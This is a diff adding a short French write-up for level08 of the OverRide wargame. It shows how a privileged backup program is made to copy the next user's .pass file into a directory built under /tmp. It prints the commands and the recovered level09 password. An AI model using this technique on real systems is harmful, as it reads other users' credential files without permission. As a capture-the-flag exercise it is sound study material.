@@ -1,0 +1,8 @@
+le programme lis le fichier donner en parametre et essaye de mettre son contenue dans un fichier portant le mene non en le faisant commencer par ./backups
+une fois cela compris une suffit donc de faire :
+
+level08@OverRide:~$		cd /tmp
+level08@OverRide:/tmp$	mkdir -p backups/home/users/level09
+level08@OverRide:/tmp$	~/level08 /home/users/level09/.pass
+level08@OverRide:/tmp$	cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
